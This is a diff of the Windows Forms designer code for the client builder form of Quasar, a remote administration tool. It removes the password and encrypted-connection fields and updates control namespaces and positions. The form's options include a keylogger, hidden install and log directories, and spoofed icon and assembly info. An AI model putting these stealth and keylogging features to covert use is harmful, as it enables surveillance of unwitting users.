@@ -41,28 +41,25 @@ namespace Quasar.Server.Forms
             this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.removeHostToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.clearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.builderTabs = new DotNetBarTabControl();
+            this.builderTabs = new Quasar.Server.Controls.DotNetBarTabControl();
             this.generalPage = new System.Windows.Forms.TabPage();
             this.label9 = new System.Windows.Forms.Label();
-            this.line6 = new Line();
+            this.line6 = new Quasar.Server.Controls.Line();
             this.label8 = new System.Windows.Forms.Label();
             this.txtTag = new System.Windows.Forms.TextBox();
             this.label7 = new System.Windows.Forms.Label();
             this.lblTag = new System.Windows.Forms.Label();
             this.txtMutex = new System.Windows.Forms.TextBox();
             this.btnMutex = new System.Windows.Forms.Button();
-            this.line5 = new Line();
+            this.line5 = new Quasar.Server.Controls.Line();
             this.lblMutex = new System.Windows.Forms.Label();
             this.label6 = new System.Windows.Forms.Label();
             this.connectionPage = new System.Windows.Forms.TabPage();
             this.numericUpDownPort = new System.Windows.Forms.NumericUpDown();
             this.numericUpDownDelay = new System.Windows.Forms.NumericUpDown();
-            this.line3 = new Line();
+            this.line3 = new Quasar.Server.Controls.Line();
             this.label4 = new System.Windows.Forms.Label();
-            this.label3 = new System.Windows.Forms.Label();
-            this.line2 = new Line();
-            this.label2 = new System.Windows.Forms.Label();
-            this.line1 = new Line();
+            this.line1 = new Quasar.Server.Controls.Line();
             this.label1 = new System.Windows.Forms.Label();
             this.lstHosts = new System.Windows.Forms.ListBox();
             this.btnAddHost = new System.Windows.Forms.Button();
@@ -71,14 +68,11 @@ namespace Quasar.Server.Forms
             this.txtHost = new System.Windows.Forms.TextBox();
             this.lblDelay = new System.Windows.Forms.Label();
             this.lblPort = new System.Windows.Forms.Label();
-            this.chkShowPass = new System.Windows.Forms.CheckBox();
-            this.txtPassword = new System.Windows.Forms.TextBox();
-            this.lblPassword = new System.Windows.Forms.Label();
             this.installationPage = new System.Windows.Forms.TabPage();
             this.chkHideSubDirectory = new System.Windows.Forms.CheckBox();
-            this.line7 = new Line();
+            this.line7 = new Quasar.Server.Controls.Line();
             this.label10 = new System.Windows.Forms.Label();
-            this.line4 = new Line();
+            this.line4 = new Quasar.Server.Controls.Line();
             this.label5 = new System.Windows.Forms.Label();
             this.chkInstall = new System.Windows.Forms.CheckBox();
             this.lblInstallName = new System.Windows.Forms.Label();
@@ -98,11 +92,11 @@ namespace Quasar.Server.Forms
             this.iconPreview = new System.Windows.Forms.PictureBox();
             this.btnBrowseIcon = new System.Windows.Forms.Button();
             this.txtIconPath = new System.Windows.Forms.TextBox();
-            this.line8 = new Line();
+            this.line8 = new Quasar.Server.Controls.Line();
             this.label11 = new System.Windows.Forms.Label();
             this.chkChangeAsmInfo = new System.Windows.Forms.CheckBox();
             this.txtFileVersion = new System.Windows.Forms.TextBox();
-            this.line9 = new Line();
+            this.line9 = new Quasar.Server.Controls.Line();
             this.lblProductName = new System.Windows.Forms.Label();
             this.label12 = new System.Windows.Forms.Label();
             this.chkChangeIcon = new System.Windows.Forms.CheckBox();
@@ -124,7 +118,7 @@ namespace Quasar.Server.Forms
             this.chkHideLogDirectory = new System.Windows.Forms.CheckBox();
             this.txtLogDirectoryName = new System.Windows.Forms.TextBox();
             this.lblLogDirectory = new System.Windows.Forms.Label();
-            this.line10 = new Line();
+            this.line10 = new Quasar.Server.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
@@ -274,7 +268,7 @@ namespace Quasar.Server.Forms
             // 
             // line6
             // 
-            this.line6.LineAlignment = Line.Alignment.Horizontal;
+            this.line6.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line6.Location = new System.Drawing.Point(83, 78);
             this.line6.Name = "line6";
             this.line6.Size = new System.Drawing.Size(300, 13);
@@ -303,7 +297,7 @@ namespace Quasar.Server.Forms
             this.label7.AutoSize = true;
             this.label7.Location = new System.Drawing.Point(17, 20);
             this.label7.Name = "label7";
-            this.label7.Size = new System.Drawing.Size(232, 13);
+            this.label7.Size = new System.Drawing.Size(231, 13);
             this.label7.TabIndex = 1;
             this.label7.Text = "You can choose a tag to identify your client.";
             // 
@@ -312,7 +306,7 @@ namespace Quasar.Server.Forms
             this.lblTag.AutoSize = true;
             this.lblTag.Location = new System.Drawing.Point(17, 43);
             this.lblTag.Name = "lblTag";
-            this.lblTag.Size = new System.Drawing.Size(61, 13);
+            this.lblTag.Size = new System.Drawing.Size(60, 13);
             this.lblTag.TabIndex = 2;
             this.lblTag.Text = "Client Tag:";
             // 
@@ -337,7 +331,7 @@ namespace Quasar.Server.Forms
             // 
             // line5
             // 
-            this.line5.LineAlignment = Line.Alignment.Horizontal;
+            this.line5.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line5.Location = new System.Drawing.Point(112, 5);
             this.line5.Name = "line5";
             this.line5.Size = new System.Drawing.Size(271, 13);
@@ -369,9 +363,6 @@ namespace Quasar.Server.Forms
             this.connectionPage.Controls.Add(this.numericUpDownDelay);
             this.connectionPage.Controls.Add(this.line3);
             this.connectionPage.Controls.Add(this.label4);
-            this.connectionPage.Controls.Add(this.label3);
-            this.connectionPage.Controls.Add(this.line2);
-            this.connectionPage.Controls.Add(this.label2);
             this.connectionPage.Controls.Add(this.line1);
             this.connectionPage.Controls.Add(this.label1);
             this.connectionPage.Controls.Add(this.lstHosts);
@@ -381,9 +372,6 @@ namespace Quasar.Server.Forms
             this.connectionPage.Controls.Add(this.txtHost);
             this.connectionPage.Controls.Add(this.lblDelay);
             this.connectionPage.Controls.Add(this.lblPort);
-            this.connectionPage.Controls.Add(this.chkShowPass);
-            this.connectionPage.Controls.Add(this.txtPassword);
-            this.connectionPage.Controls.Add(this.lblPassword);
             this.connectionPage.Location = new System.Drawing.Point(140, 4);
             this.connectionPage.Name = "connectionPage";
             this.connectionPage.Padding = new System.Windows.Forms.Padding(3);
@@ -415,7 +403,7 @@ namespace Quasar.Server.Forms
             // 
             // numericUpDownDelay
             // 
-            this.numericUpDownDelay.Location = new System.Drawing.Point(276, 282);
+            this.numericUpDownDelay.Location = new System.Drawing.Point(276, 178);
             this.numericUpDownDelay.Maximum = new decimal(new int[] {
             600000,
             0,
@@ -433,8 +421,8 @@ namespace Quasar.Server.Forms
             // 
             // line3
             // 
-            this.line3.LineAlignment = Line.Alignment.Horizontal;
-            this.line3.Location = new System.Drawing.Point(95, 263);
+            this.line3.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
+            this.line3.Location = new System.Drawing.Point(95, 159);
             this.line3.Name = "line3";
             this.line3.Size = new System.Drawing.Size(290, 13);
             this.line3.TabIndex = 18;
@@ -443,43 +431,15 @@ namespace Quasar.Server.Forms
             // label4
             // 
             this.label4.AutoSize = true;
-            this.label4.Location = new System.Drawing.Point(6, 263);
+            this.label4.Location = new System.Drawing.Point(6, 159);
             this.label4.Name = "label4";
             this.label4.Size = new System.Drawing.Size(92, 13);
             this.label4.TabIndex = 17;
             this.label4.Text = "Reconnect Delay";
             // 
-            // label3
-            // 
-            this.label3.AutoSize = true;
-            this.label3.ForeColor = System.Drawing.Color.SteelBlue;
-            this.label3.Location = new System.Drawing.Point(17, 179);
-            this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(318, 13);
-            this.label3.TabIndex = 16;
-            this.label3.Text = "Don\'t forget to set the same password in the server settings.";
-            // 
-            // line2
-            // 
-            this.line2.LineAlignment = Line.Alignment.Horizontal;
-            this.line2.Location = new System.Drawing.Point(123, 161);
-            this.line2.Name = "line2";
-            this.line2.Size = new System.Drawing.Size(260, 13);
-            this.line2.TabIndex = 15;
-            this.line2.TabStop = false;
-            // 
-            // label2
-            // 
-            this.label2.AutoSize = true;
-            this.label2.Location = new System.Drawing.Point(6, 161);
-            this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(121, 13);
-            this.label2.TabIndex = 14;
-            this.label2.Text = "Encrypted Connection";
-            // 
             // line1
             // 
-            this.line1.LineAlignment = Line.Alignment.Horizontal;
+            this.line1.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line1.Location = new System.Drawing.Point(104, 5);
             this.line1.Name = "line1";
             this.line1.Size = new System.Drawing.Size(281, 13);
@@ -518,7 +478,7 @@ namespace Quasar.Server.Forms
             // lblMS
             // 
             this.lblMS.AutoSize = true;
-            this.lblMS.Location = new System.Drawing.Point(356, 287);
+            this.lblMS.Location = new System.Drawing.Point(356, 183);
             this.lblMS.Name = "lblMS";
             this.lblMS.Size = new System.Drawing.Size(21, 13);
             this.lblMS.TabIndex = 11;
@@ -543,7 +503,7 @@ namespace Quasar.Server.Forms
             // lblDelay
             // 
             this.lblDelay.AutoSize = true;
-            this.lblDelay.Location = new System.Drawing.Point(17, 286);
+            this.lblDelay.Location = new System.Drawing.Point(17, 182);
             this.lblDelay.Name = "lblDelay";
             this.lblDelay.Size = new System.Drawing.Size(199, 13);
             this.lblDelay.TabIndex = 9;
@@ -557,35 +517,6 @@ namespace Quasar.Server.Forms
             this.lblPort.Size = new System.Drawing.Size(31, 13);
             this.lblPort.TabIndex = 2;
             this.lblPort.Text = "Port:";
-            // 
-            // chkShowPass
-            // 
-            this.chkShowPass.AutoSize = true;
-            this.chkShowPass.Location = new System.Drawing.Point(276, 228);
-            this.chkShowPass.Name = "chkShowPass";
-            this.chkShowPass.Size = new System.Drawing.Size(107, 17);
-            this.chkShowPass.TabIndex = 8;
-            this.chkShowPass.Text = "Show Password";
-            this.chkShowPass.UseVisualStyleBackColor = true;
-            this.chkShowPass.CheckedChanged += new System.EventHandler(this.chkShowPass_CheckedChanged);
-            // 
-            // txtPassword
-            // 
-            this.txtPassword.Location = new System.Drawing.Point(182, 200);
-            this.txtPassword.Name = "txtPassword";
-            this.txtPassword.PasswordChar = '•';
-            this.txtPassword.Size = new System.Drawing.Size(201, 22);
-            this.txtPassword.TabIndex = 7;
-            this.txtPassword.TextChanged += new System.EventHandler(this.HasChangedSetting);
-            // 
-            // lblPassword
-            // 
-            this.lblPassword.AutoSize = true;
-            this.lblPassword.Location = new System.Drawing.Point(17, 203);
-            this.lblPassword.Name = "lblPassword";
-            this.lblPassword.Size = new System.Drawing.Size(59, 13);
-            this.lblPassword.TabIndex = 6;
-            this.lblPassword.Text = "Password:";
             // 
             // installationPage
             // 
@@ -632,7 +563,7 @@ namespace Quasar.Server.Forms
             // 
             // line7
             // 
-            this.line7.LineAlignment = Line.Alignment.Horizontal;
+            this.line7.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line7.Location = new System.Drawing.Point(60, 274);
             this.line7.Name = "line7";
             this.line7.Size = new System.Drawing.Size(323, 13);
@@ -650,7 +581,7 @@ namespace Quasar.Server.Forms
             // 
             // line4
             // 
-            this.line4.LineAlignment = Line.Alignment.Horizontal;
+            this.line4.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line4.Location = new System.Drawing.Point(117, 5);
             this.line4.Name = "line4";
             this.line4.Size = new System.Drawing.Size(266, 13);
@@ -863,7 +794,7 @@ namespace Quasar.Server.Forms
             // 
             // line8
             // 
-            this.line8.LineAlignment = Line.Alignment.Horizontal;
+            this.line8.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line8.Location = new System.Drawing.Point(122, 5);
             this.line8.Name = "line8";
             this.line8.Size = new System.Drawing.Size(261, 13);
@@ -900,7 +831,7 @@ namespace Quasar.Server.Forms
             // 
             // line9
             // 
-            this.line9.LineAlignment = Line.Alignment.Horizontal;
+            this.line9.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line9.Location = new System.Drawing.Point(83, 276);
             this.line9.Name = "line9";
             this.line9.Size = new System.Drawing.Size(300, 13);
@@ -941,7 +872,7 @@ namespace Quasar.Server.Forms
             this.lblFileVersion.AutoSize = true;
             this.lblFileVersion.Location = new System.Drawing.Point(17, 243);
             this.lblFileVersion.Name = "lblFileVersion";
-            this.lblFileVersion.Size = new System.Drawing.Size(70, 13);
+            this.lblFileVersion.Size = new System.Drawing.Size(69, 13);
             this.lblFileVersion.TabIndex = 15;
             this.lblFileVersion.Text = "File Version:";
             // 
@@ -975,7 +906,7 @@ namespace Quasar.Server.Forms
             this.lblProductVersion.AutoSize = true;
             this.lblProductVersion.Location = new System.Drawing.Point(17, 215);
             this.lblProductVersion.Name = "lblProductVersion";
-            this.lblProductVersion.Size = new System.Drawing.Size(92, 13);
+            this.lblProductVersion.Size = new System.Drawing.Size(91, 13);
             this.lblProductVersion.TabIndex = 13;
             this.lblProductVersion.Text = "Product Version:";
             // 
@@ -1043,7 +974,7 @@ namespace Quasar.Server.Forms
             this.lblTrademarks.AutoSize = true;
             this.lblTrademarks.Location = new System.Drawing.Point(17, 159);
             this.lblTrademarks.Name = "lblTrademarks";
-            this.lblTrademarks.Size = new System.Drawing.Size(68, 13);
+            this.lblTrademarks.Size = new System.Drawing.Size(67, 13);
             this.lblTrademarks.TabIndex = 9;
             this.lblTrademarks.Text = "Trademarks:";
             // 
@@ -1101,7 +1032,7 @@ namespace Quasar.Server.Forms
             // 
             // line10
             // 
-            this.line10.LineAlignment = Line.Alignment.Horizontal;
+            this.line10.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line10.Location = new System.Drawing.Point(72, 5);
             this.line10.Name = "line10";
             this.line10.Size = new System.Drawing.Size(308, 13);
@@ -1168,10 +1099,6 @@ namespace Quasar.Server.Forms
         }
 
         #endregion
-
-        private System.Windows.Forms.CheckBox chkShowPass;
-        private System.Windows.Forms.TextBox txtPassword;
-        private System.Windows.Forms.Label lblPassword;
         private System.Windows.Forms.Label lblPort;
         private System.Windows.Forms.TextBox txtHost;
         private System.Windows.Forms.Label lblHost;
@@ -1232,9 +1159,6 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.Label label1;
         private Controls.Line line3;
         private System.Windows.Forms.Label label4;
-        private System.Windows.Forms.Label label3;
-        private Controls.Line line2;
-        private System.Windows.Forms.Label label2;
         private Controls.Line line4;
         private System.Windows.Forms.Label label5;
         private System.Windows.Forms.TabPage generalPage;
